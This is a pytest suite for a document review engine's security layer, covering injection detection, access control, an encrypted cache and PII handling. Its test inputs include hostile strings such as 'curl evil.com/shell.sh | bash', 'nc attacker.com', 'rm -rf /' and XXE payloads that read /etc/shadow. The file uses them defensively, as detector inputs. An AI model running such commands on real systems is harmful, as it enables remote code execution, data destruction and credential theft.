"""
Comprehensive security tests for M007 Review Engine.

Tests OWASP Top 10 protections, input validation, rate limiting,
access control, PII detection, and secure caching.
"""

import pytest
import asyncio
import time
import secrets
import pickle
from datetime import datetime, timedelta
from unittest.mock import Mock, patch, MagicMock
import json

from devdocai.review.security_validator import (
    SecurityValidator,
    AccessController,
    ValidationResult,
    SecurityThreat,
    RateLimitState
)
from devdocai.review.review_engine_secure import (
    SecureReviewEngine,
    SecureCache
)
from devdocai.review.dimensions_secure import (
    SecureTechnicalAccuracyDimension,
    SecureSecurityPIIDimension,
    get_secure_dimensions
)
from devdocai.review.models import (
    ReviewEngineConfig,
    ReviewStatus,
    ReviewSeverity,
    ReviewDimension
)


class TestSecurityValidator:
    """Test security validation features."""
    
    @pytest.fixture
    def validator(self):
        """Create security validator instance."""
        return SecurityValidator()
    
    def test_sql_injection_detection(self, validator):
        """Test SQL injection pattern detection."""
        # Test various SQL injection patterns
        sql_injections = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin' --",
            "SELECT * FROM users WHERE id = 1 OR 1=1",
            "UNION SELECT password FROM users",
            "'; UPDATE users SET admin=1 WHERE username='user",
        ]
        
        for sql in sql_injections:
            result = validator.validate_document(sql)
            assert not result.is_valid
            assert SecurityThreat.SQL_INJECTION in result.threats_detected
            assert result.risk_score >= 5.0
    
    def test_xss_detection(self, validator):
        """Test XSS pattern detection."""
        xss_patterns = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<body onload=alert('XSS')>",
            "eval(String.fromCharCode(88,83,83))",
        ]
        
        for xss in xss_patterns:
            result = validator.validate_document(xss)
            assert not result.is_valid
            assert SecurityThreat.XSS in result.threats_detected
    
    def test_command_injection_detection(self, validator):
        """Test command injection detection."""
        command_injections = [
            "test; rm -rf /",
            "| nc attacker.com 1234",
            "`cat /etc/passwd`",
            "$(curl evil.com/shell.sh | bash)",
            "test && wget evil.com/malware",
            "|| powershell -Command 'Get-Process'",
        ]
        
        for cmd in command_injections:
            result = validator.validate_document(cmd)
            assert not result.is_valid
            assert SecurityThreat.COMMAND_INJECTION in result.threats_detected
    
    def test_path_traversal_detection(self, validator):
        """Test path traversal detection."""
        path_traversals = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "C:\\windows\\system32\\",
        ]
        
        for path in path_traversals:
            result = validator.validate_document(path)
            assert not result.is_valid
            assert SecurityThreat.PATH_TRAVERSAL in result.threats_detected
    
    def test_hardcoded_secrets_detection(self, validator):
        """Test hardcoded secrets detection."""
        secrets_patterns = [
            'api_key = "sk_live_4242424242424242"',
            'password = "super_secret_password_123"',
            'AWS_SECRET_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"',
            'token: "ghp_1234567890abcdef1234567890abcdef12345"',
            'apikey="AIzaSyDkjsdkfjksjdfkjskdfjksjdfkjskdfj"',
        ]
        
        for secret in secrets_patterns:
            result = validator.validate_document(secret)
            assert not result.is_valid
            assert SecurityThreat.HARDCODED_SECRETS in result.threats_detected
    
    def test_xxe_detection(self, validator):
        """Test XXE (XML External Entity) detection."""
        xxe_patterns = [
            '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            '<!ENTITY % file SYSTEM "file:///etc/shadow">',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>',
        ]
        
        for xxe in xxe_patterns:
            result = validator.validate_document(xxe)
            assert not result.is_valid
            assert SecurityThreat.XXE in result.threats_detected
    
    def test_content_sanitization(self, validator):
        """Test content sanitization."""
        # HTML sanitization
        html_content = '<script>alert("XSS")</script><p>Safe content</p>'
        sanitized = validator.sanitize_content(html_content, "html")
        assert '<script>' not in sanitized
        assert '<p>Safe content</p>' in sanitized
        
        # Text sanitization
        text_content = '<script>alert("XSS")</script>'
        sanitized = validator.sanitize_content(text_content, "text")
        assert '&lt;script&gt;' in sanitized
        
        # Code sanitization
        code_content = 'password = "secret123"'
        sanitized = validator.sanitize_content(code_content, "code")
        assert '[REDACTED]' in sanitized
    
    def test_path_validation(self, validator):
        """Test file path validation."""
        # Valid paths
        valid_paths = [
            "documents/file.txt",
            "data/reports/2024/report.pdf",
            "uploads/image.jpg",
        ]
        
        for path in valid_paths:
            is_valid, safe_path = validator.validate_path(path)
            assert is_valid
            assert safe_path is not None
        
        # Invalid paths
        invalid_paths = [
            "../../../etc/passwd",
            "/etc/passwd",
            "C:\\windows\\system32\\config\\sam",
            "a" * 300,  # Too long
        ]
        
        for path in invalid_paths:
            is_valid, safe_path = validator.validate_path(path)
            assert not is_valid
            assert safe_path is None
    
    def test_rate_limiting(self, validator):
        """Test rate limiting with token bucket."""
        client_id = "test_client"
        
        # Should allow initial burst
        for i in range(20):  # MAX_BURST_SIZE
            assert validator.check_rate_limit(client_id)
        
        # Should start limiting after burst
        allowed = 0
        denied = 0
        for i in range(10):
            if validator.check_rate_limit(client_id):
                allowed += 1
            else:
                denied += 1
        
        assert denied > 0  # Some requests should be denied
        
        # Test rate limit recovery over time
        time.sleep(1)  # Wait for tokens to replenish
        assert validator.check_rate_limit(client_id)  # Should be allowed again
    
    def test_metadata_validation(self, validator):
        """Test metadata validation for injection attacks."""
        # Valid metadata
        valid_metadata = {
            "title": "Test Document",
            "author": "John Doe",
            "tags": ["review", "security"],
            "count": 42,
            "active": True
        }
        result = validator.validate_metadata(valid_metadata)
        assert result.is_valid
        
        # Metadata with SQL injection
        malicious_metadata = {
            "title": "'; DROP TABLE users; --",
            "author": "admin' OR '1'='1",
        }
        result = validator.validate_metadata(malicious_metadata)
        assert not result.is_valid
        assert SecurityThreat.SQL_INJECTION in result.threats_detected
        
        # Metadata with XSS
        xss_metadata = {
            "description": "<script>alert('XSS')</script>",
        }
        result = validator.validate_metadata(xss_metadata)
        assert not result.is_valid
        assert SecurityThreat.XSS in result.threats_detected
        
        # Oversized metadata
        oversized_metadata = {
            "data": "x" * 2000,  # Exceeds MAX_FIELD_LENGTH
        }
        result = validator.validate_metadata(oversized_metadata)
        assert not result.is_valid
    
    def test_secure_hashing(self, validator):
        """Test secure hash generation and verification."""
        content = "sensitive data"
        
        # Generate hash
        hash1 = validator.create_secure_hash(content)
        assert ":" in hash1  # Should contain salt:hash format
        
        # Verify correct content
        assert validator.verify_secure_hash(content, hash1)
        
        # Should not verify wrong content
        assert not validator.verify_secure_hash("wrong data", hash1)
        
        # Different hashes for same content (different salts)
        hash2 = validator.create_secure_hash(content)
        assert hash1 != hash2
    
    def test_security_report(self, validator):
        """Test security report generation."""
        # Perform some validations to generate events
        validator.validate_document("SELECT * FROM users")
        validator.validate_document("<script>alert(1)</script>")
        validator.check_rate_limit("client1")
        
        report = validator.get_security_report()
        
        assert "total_validations" in report
        assert "blocked_ips" in report
        assert "rate_limiters_active" in report
        assert "recent_threats" in report
        assert "security_headers" in report
        
        # Check security headers
        headers = report["security_headers"]
        assert headers["X-Frame-Options"] == "DENY"
        assert headers["X-Content-Type-Options"] == "nosniff"
        assert "Content-Security-Policy" in headers


class TestAccessController:
    """Test access control features."""
    
    @pytest.fixture
    def access_controller(self):
        """Create access controller instance."""
        return AccessController()
    
    def test_role_management(self, access_controller):
        """Test role granting and revoking."""
        user_id = "user123"
        
        # Grant role
        access_controller.grant_role(user_id, "reviewer")
        assert "reviewer" in access_controller.user_roles[user_id]
        
        # Grant another role
        access_controller.grant_role(user_id, "viewer")
        assert len(access_controller.user_roles[user_id]) == 2
        
        # Revoke role
        access_controller.revoke_role(user_id, "viewer")
        assert "viewer" not in access_controller.user_roles[user_id]
        assert "reviewer" in access_controller.user_roles[user_id]
    
    def test_permission_checking(self, access_controller):
        """Test permission validation."""
        user_id = "user456"
        
        # No permissions initially
        assert not access_controller.check_permission(user_id, "review.create")
        
        # Grant reviewer role
        access_controller.grant_role(user_id, "reviewer")
        assert access_controller.check_permission(user_id, "review.create")
        assert access_controller.check_permission(user_id, "review.read")
        assert not access_controller.check_permission(user_id, "audit.read")
        
        # Grant auditor role
        access_controller.grant_role(user_id, "auditor")
        assert access_controller.check_permission(user_id, "audit.read")
    
    def test_admin_permissions(self, access_controller):
        """Test admin wildcard permissions."""
        admin_id = "admin123"
        
        # Grant admin role
        access_controller.grant_role(admin_id, "admin")
        
        # Admin should have all permissions
        assert access_controller.check_permission(admin_id, "review.create")
        assert access_controller.check_permission(admin_id, "audit.read")
        assert access_controller.check_permission(admin_id, "any.permission")
    
    def test_user_permissions_list(self, access_controller):
        """Test getting all user permissions."""
        user_id = "user789"
        
        # Initially empty
        permissions = access_controller.get_user_permissions(user_id)
        assert len(permissions) == 0
        
        # Add reviewer role
        access_controller.grant_role(user_id, "reviewer")
        permissions = access_controller.get_user_permissions(user_id)
        assert "review.create" in permissions
        assert "review.read" in permissions
        assert "review.update" in permissions
        
        # Add admin role
        access_controller.grant_role(user_id, "admin")
        permissions = access_controller.get_user_permissions(user_id)
        assert permissions == ["*"]  # Admin has all


class TestSecureCache:
    """Test encrypted cache functionality."""
    
    @pytest.fixture
    async def cache(self):
        """Create secure cache instance."""
        return SecureCache(max_size=10, ttl_seconds=5)
    
    @pytest.mark.asyncio
    async def test_cache_encryption(self, cache):
        """Test cache value encryption."""
        key = "test_key"
        value = {"sensitive": "data", "secret": 12345}
        
        # Set value
        await cache.set(key, value)
        
        # Get value
        retrieved = await cache.get(key)
        assert retrieved == value
        
        # Verify values are encrypted in storage
        secure_key = cache._generate_cache_key(key)
        encrypted_data, _, _ = cache.cache[secure_key]
        assert encrypted_data != pickle.dumps(value)  # Should be encrypted
    
    @pytest.mark.asyncio
    async def test_cache_expiration(self, cache):
        """Test cache TTL expiration."""
        key = "expiring_key"
        value = "test_value"
        
        # Set value with 5 second TTL
        await cache.set(key, value)
        assert await cache.get(key) == value
        
        # Wait for expiration
        await asyncio.sleep(6)
        assert await cache.get(key) is None
    
    @pytest.mark.asyncio
    async def test_cache_lru_eviction(self, cache):
        """Test LRU eviction when cache is full."""
        # Fill cache to max size (10)
        for i in range(10):
            await cache.set(f"key_{i}", f"value_{i}")
        
        assert len(cache.cache) == 10
        
        # Add one more - should evict least recently used
        await cache.set("key_new", "value_new")
        assert len(cache.cache) == 10
        assert await cache.get("key_0") is None  # First key should be evicted
        assert await cache.get("key_new") == "value_new"
    
    @pytest.mark.asyncio
    async def test_cache_integrity(self, cache):
        """Test cache integrity checking."""
        key = "integrity_key"
        value = "test_value"
        
        # Set value
        await cache.set(key, value)
        
        # Tamper with cache directly
        secure_key = cache._generate_cache_key(key)
        encrypted_data, timestamp, _ = cache.cache[secure_key]
        cache.cache[secure_key] = (encrypted_data, timestamp, "wrong_hash")
        
        # Should detect tampering and return None
        assert await cache.get(key) is None
    
    @pytest.mark.asyncio
    async def test_cache_hit_rate(self, cache):
        """Test cache hit rate calculation."""
        # Initial hit rate is 0
        assert cache.hit_rate == 0.0
        
        # Set some values
        await cache.set("key1", "value1")
        await cache.set("key2", "value2")
        
        # Get values (hits)
        await cache.get("key1")
        await cache.get("key2")
        
        # Get non-existent (miss)
        await cache.get("key3")
        
        # Hit rate should be 2/3
        assert cache.hit_rate == pytest.approx(0.667, rel=0.01)


class TestSecureReviewEngine:
    """Test secure review engine functionality."""
    
    @pytest.fixture
    async def engine(self):
        """Create secure review engine instance."""
        config = ReviewEngineConfig(
            enable_cache=True,
            cache_ttl_seconds=60,
            parallel_workers=2
        )
        return SecureReviewEngine(config)
    
    @pytest.mark.asyncio
    async def test_access_control_enforcement(self, engine):
        """Test that access control is enforced."""
        # User without permissions
        user_id = "unauthorized_user"
        
        with pytest.raises(PermissionError, match="does not have permission"):
            await engine.review_document(
                content="Test document",
                user_id=user_id
            )
    
    @pytest.mark.asyncio
    async def test_rate_limiting_enforcement(self, engine):
        """Test rate limiting in review engine."""
        # Mock rate limiter to always deny
        engine.security_validator.check_rate_limit = Mock(return_value=False)
        
        with pytest.raises(Exception, match="Rate limit exceeded"):
            await engine.review_document(
                content="Test document",
                user_id="rate_limited_user"
            )
    
    @pytest.mark.asyncio
    async def test_malicious_content_rejection(self, engine):
        """Test rejection of malicious content."""
        # Grant permission first
        engine.access_controller.grant_role("test_user", "reviewer")
        
        # SQL injection content
        malicious_content = "'; DROP TABLE users; --"
        result = await engine.review_document(
            content=malicious_content,
            user_id="test_user"
        )
        
        assert result.status == ReviewStatus.REJECTED
        assert result.overall_score == 0.0
        assert any("Security Threat" in issue.title for issue in result.issues)
    
    @pytest.mark.asyncio
    async def test_pii_detection_and_redaction(self, engine):
        """Test PII detection and optional redaction."""
        # Grant permission
        engine.access_controller.grant_role("test_user", "reviewer")
        
        # Content with PII
        pii_content = """
        Contact John Doe at john.doe@email.com or call 555-123-4567.
        His SSN is 123-45-6789.
        """
        
        # Enable PII redaction
        engine.config.redact_pii = True
        
        result = await engine.review_document(
            content=pii_content,
            user_id="test_user"
        )
        
        # Check that PII was detected
        assert result.metadata.get("pii_detected") == True
        
        # Should have PII-related issues
        pii_issues = [i for i in result.issues if i.dimension == ReviewDimension.SECURITY_PII]
        assert len(pii_issues) > 0
    
    @pytest.mark.asyncio
    async def test_secure_caching(self, engine):
        """Test that caching works securely."""
        # Grant permission
        engine.access_controller.grant_role("test_user", "reviewer")
        
        content = "Safe test document content"
        
        # First review - should cache
        result1 = await engine.review_document(
            content=content,
            document_id="doc123",
            user_id="test_user"
        )
        
        # Second review - should hit cache
        result2 = await engine.review_document(
            content=content,
            document_id="doc123",
            user_id="test_user"
        )
        
        assert result2.from_cache == True
        assert result2.execution_time_ms < result1.metadata["execution_time_ms"]
    
    @pytest.mark.asyncio
    async def test_audit_logging(self, engine):
        """Test audit logging functionality."""
        # Grant permission
        engine.access_controller.grant_role("test_user", "reviewer")
        
        # Clear audit log
        engine.audit_logger.handlers[0].stream = MagicMock()
        
        # Perform review
        await engine.review_document(
            content="Test document",
            document_id="audit_test",
            user_id="test_user"
        )
        
        # Check audit events were logged
        # Note: In real implementation, we'd check the actual log file
        assert engine.security_metrics["validations_performed"] > 0
    
    @pytest.mark.asyncio
    async def test_security_metrics(self, engine):
        """Test security metrics collection."""
        initial_metrics = await engine.get_security_metrics()
        
        assert "validations_performed" in initial_metrics
        assert "threats_detected" in initial_metrics
        assert "rate_limits_hit" in initial_metrics
        assert "access_denied" in initial_metrics
        assert "pii_detected" in initial_metrics
        
        # Trigger some security events
        engine.security_metrics["threats_detected"] = 5
        engine.security_metrics["pii_detected"] = 3
        
        updated_metrics = await engine.get_security_metrics()
        assert updated_metrics["threats_detected"] == 5
        assert updated_metrics["pii_detected"] == 3
    
    @pytest.mark.asyncio
    async def test_batch_review_security(self, engine):
        """Test batch review with security controls."""
        # Grant batch permission
        engine.access_controller.grant_role("batch_user", "reviewer")
        
        documents = [
            {"content": "Safe document 1", "id": "doc1"},
            {"content": "'; DROP TABLE users; --", "id": "doc2"},  # Malicious
            {"content": "Safe document 3", "id": "doc3"},
        ]
        
        results = await engine.batch_review_secure(
            documents=documents,
            user_id="batch_user",
            batch_size=2
        )
        
        assert len(results) == 3
        
        # Check that malicious document was flagged
        malicious_result = next(r for r in results if r.document_id == "doc2")
        assert malicious_result.status == ReviewStatus.REJECTED
        assert malicious_result.overall_score == 0.0


class TestSecureDimensions:
    """Test security-enhanced dimensions."""
    
    @pytest.fixture
    def tech_dimension(self):
        """Create secure technical accuracy dimension."""
        return SecureTechnicalAccuracyDimension()
    
    @pytest.fixture
    def security_dimension(self):
        """Create secure security/PII dimension."""
        return SecureSecurityPIIDimension()
    
    @pytest.mark.asyncio
    async def test_technical_security_checks(self, tech_dimension):
        """Test technical dimension security checks."""
        # Content with security issues
        vulnerable_code = """
        def get_user(user_id):
            query = "SELECT * FROM users WHERE id = " + user_id
            return db.execute(query)
        
        password = "hardcoded_password_123"
        
        import md5  # Weak crypto
        hash = md5.new(password).hexdigest()
        """
        
        result = await tech_dimension.analyze(vulnerable_code, {})
        
        assert result.score < 50  # Should have low score due to vulnerabilities
        
        # Check for specific security issues
        issue_titles = [issue.title for issue in result.issues]
        assert any("SQL Injection" in title for title in issue_titles)
        assert any("Hardcoded Secrets" in title for title in issue_titles)
        assert any("Weak Cryptography" in title for title in issue_titles)
    
    @pytest.mark.asyncio
    async def test_pii_dimension_comprehensive(self, security_dimension):
        """Test comprehensive PII and security detection."""
        content_with_issues = """
        Customer: John Smith
        Email: john.smith@company.com
        Phone: 555-123-4567
        SSN: 123-45-6789
        Credit Card: 4111-1111-1111-1111
        
        <script>alert('XSS')</script>
        
        ../../../etc/passwd
        """
        
        result = await security_dimension.analyze(content_with_issues, {})
        
        assert result.score < 30  # Should have very low score
        
        # Check metrics
        assert result.metrics["pii_instances"] > 0
        assert result.metrics["threats_detected"] > 0
        
        # Check for various issue types
        issue_titles = [issue.title for issue in result.issues]
        assert any("PII Detected" in title for title in issue_titles)
        assert any("Security Threat" in title or "XSS" in title for title in issue_titles)
        assert any("Path Traversal" in title for title in issue_titles)
    
    @pytest.mark.asyncio
    async def test_dimension_input_validation(self, tech_dimension):
        """Test dimension input validation."""
        # Oversized content
        huge_content = "x" * (11 * 1024 * 1024)  # Over 10MB
        
        result = await tech_dimension.analyze(huge_content, {})
        
        assert result.score == 0.0
        assert len(result.issues) == 1
        assert result.issues[0].title == "Input Validation Failed"
        assert result.issues[0].severity == ReviewSeverity.BLOCKER
    
    def test_secure_regex_timeout(self):
        """Test regex timeout protection against ReDoS."""
        from devdocai.review.dimensions_secure import SecureRegexPatterns
        
        # Create a pattern that could cause ReDoS
        evil_pattern = re.compile(r'(a+)+b')
        evil_input = "a" * 100  # This could cause exponential backtracking
        
        # Should timeout and return empty list instead of hanging
        matches = SecureRegexPatterns.safe_search(
            evil_pattern,
            evil_input,
            timeout=0.1  # Very short timeout
        )
        
        # Should have timed out and returned empty
        assert matches == []


class TestSecurityIntegration:
    """Integration tests for security features."""
    
    @pytest.mark.asyncio
    async def test_end_to_end_secure_review(self):
        """Test complete secure review workflow."""
        # Create engine
        config = ReviewEngineConfig(
            enable_cache=True,
            persist_results=False,
            use_quality_engine=False,
            use_miair_optimization=False
        )
        engine = SecureReviewEngine(config)
        
        # Setup user with permissions
        engine.access_controller.grant_role("integration_user", "reviewer")
        
        # Test document with mixed content
        test_document = """
        # Technical Documentation
        
        This document contains various content types for testing.
        
        ## Code Example
        ```python
        def process_user_input(input_str):
            # TODO: Add validation
            query = f"SELECT * FROM users WHERE name = '{input_str}'"
            return database.execute(query)
        ```
        
        ## Contact Information
        For support, contact support@example.com
        
        ## Configuration
        The API key is: sk_live_test_1234567890abcdef
        """
        
        # Perform review
        result = await engine.review_document(
            content=test_document,
            document_id="integration_test",
            document_type="technical",
            user_id="integration_user"
        )
        
        # Verify review completed
        assert result is not None
        assert result.document_id == "integration_test"
        
        # Should have security issues
        assert len(result.issues) > 0
        security_issues = [
            i for i in result.issues
            if i.dimension == ReviewDimension.SECURITY_PII
            or "security_related" in i.metadata
        ]
        assert len(security_issues) > 0
        
        # Score should be reduced due to security issues
        assert result.overall_score < 80
        
        # Should have security metadata
        assert "security_validated" in result.metadata
        assert "threats_detected" in result.metadata
        
        # Cleanup
        await engine.cleanup()
    
    @pytest.mark.asyncio
    async def test_security_monitoring(self):
        """Test security monitoring and alerting."""
        config = ReviewEngineConfig()
        engine = SecureReviewEngine(config)
        
        # Simulate security events
        engine.security_metrics["access_denied"] = 150  # High denial rate
        engine.security_metrics["rate_limits_hit"] = 75  # Excessive rate limiting
        engine.security_metrics["cache_poisoning_attempts"] = 5  # Cache attacks
        
        # Trigger security check
        await engine._perform_security_checks()
        
        # Metrics should be reset after alerting
        assert engine.security_metrics["access_denied"] == 0
        assert engine.security_metrics["rate_limits_hit"] == 0
        assert engine.security_metrics["cache_poisoning_attempts"] == 0
        
        await engine.cleanup()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])